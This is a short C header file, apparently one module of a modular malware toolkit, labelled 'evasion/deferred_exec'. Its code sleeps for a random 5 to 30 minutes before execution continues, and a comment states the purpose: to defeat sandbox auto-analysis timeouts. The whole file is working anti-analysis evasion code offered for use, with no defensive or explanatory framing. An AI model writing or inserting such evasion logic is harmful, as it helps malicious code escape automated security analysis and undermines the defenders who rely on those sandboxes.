// chunk: evasion/deferred_exec
// depends: (none)
// provides: deferred_wait
// headers: windows.h
// note: Sleep 5-30 minutes before starting — defeats sandbox auto-analysis timeouts

#ifndef CHUNK_DEFERRED_EXEC
#define CHUNK_DEFERRED_EXEC

static void deferred_wait(void) {
    DWORD base = 5 * 60 * 1000;
    DWORD range = 25 * 60 * 1000;
    DWORD wait = base + (GetTickCount() % range);
    DWORD chunk = 60000;
    while (wait > 0) {
        DWORD s = (wait > chunk) ? chunk : wait;
        Sleep(s);
        wait -= s;
    }
}

#endif
